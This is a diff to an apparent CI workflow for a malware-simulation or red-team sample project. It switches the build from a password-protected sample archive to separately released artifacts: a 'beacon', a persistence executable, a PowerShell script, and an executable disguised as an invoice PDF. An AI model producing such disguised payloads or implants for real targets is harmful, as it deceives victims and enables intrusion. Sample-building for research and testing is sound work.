@@ -21,13 +21,11 @@ jobs:
     - name: write scripts into constants
       run: python .\utils\write_scripts_into_constants.py
     - name: run pyinstaller
-      run: pyinstaller -F main.py -n sample
+      run: pyinstaller -F beacon.py
     - name: run gcc
-      run: gcc -o sample_start.exe main.c script_constants_c/script_constants.c helpers.c
-    - name: setup 7zip
-      uses: milliewalky/setup-7-zip@v1
-    - name: zip sample
-      run: 7z a -t7z -p'infected' sample.7z dist
+      run: gcc -o Rechnung.pdf.exe Rechnung.pdf.c script_constants/script_constants.c helpers.c
+    - name: run gcc
+      run: gcc -o persistance.exe persistance.c helpers.c
     - uses: ncipollo/release-action@v1
       with:
-        artifacts: "sample.7z,sample_start.exe"
+        artifacts: "dist/beacon.exe,Rechnung.pdf.exe,persistance.exe,utils/prepare-important-files.ps1"
